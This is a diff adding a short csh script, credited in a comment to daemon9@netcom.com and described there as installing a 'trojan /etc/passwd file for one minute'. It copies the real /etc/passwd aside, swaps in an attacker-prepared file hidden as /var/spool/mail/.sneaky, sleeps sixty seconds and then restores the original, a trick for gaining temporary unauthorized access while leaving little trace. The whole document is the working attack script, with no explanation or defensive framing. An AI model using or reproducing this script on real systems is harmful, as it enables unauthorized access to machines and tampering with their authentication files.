@@ -1,0 +1,8 @@
+#!/bin/csh
+# Install trojan /etc/passwd file for one minute
+#daemon9@netcom.com
+
+cp /etc/passwd /etc/.temppass
+cp /var/spool/mail/.sneaky /etc/passwd
+sleep 60
+mv /etc/.temppass /etc/passwd
